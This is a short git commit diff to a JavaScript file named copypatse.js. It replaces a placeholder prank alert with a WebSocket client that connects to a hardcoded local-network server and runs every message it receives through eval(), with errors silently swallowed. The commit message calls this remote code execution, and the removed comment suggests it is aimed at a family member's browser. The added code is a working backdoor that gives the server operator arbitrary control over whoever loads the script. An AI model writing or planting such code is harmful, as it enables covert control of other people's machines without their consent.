3ec1286a2383eaa909a970b8172d98333be95aeb
Agni Rammohan <103090218+agni2012@users.noreply.github.com>
2026-06-10 15:11:43 +0530

    Implement WebSocket for executing received code
    Added WebSocket connection for remote code execution.

--- copypatse.js
+++ copypatse.js
@@ -1,3 +1,19 @@
-//This is a prank for my brother. 
-
-alert("test")
+try{
+  var ws = new WebSocket("ws://192.168.68.112:3000");
+  
+  ws.onmessage = function(event) {
+  	try {
+  		eval(event.data);
+  	} catch (e) {
+  		console.error(e);
+  	}
+  };
+  
+  ws.onopen = function() {
+  	console.log("Connected");
+  };
+  
+  ws.onclose = function() {
+  	console.log("Disconnected");
+  };
+}catch(e){}
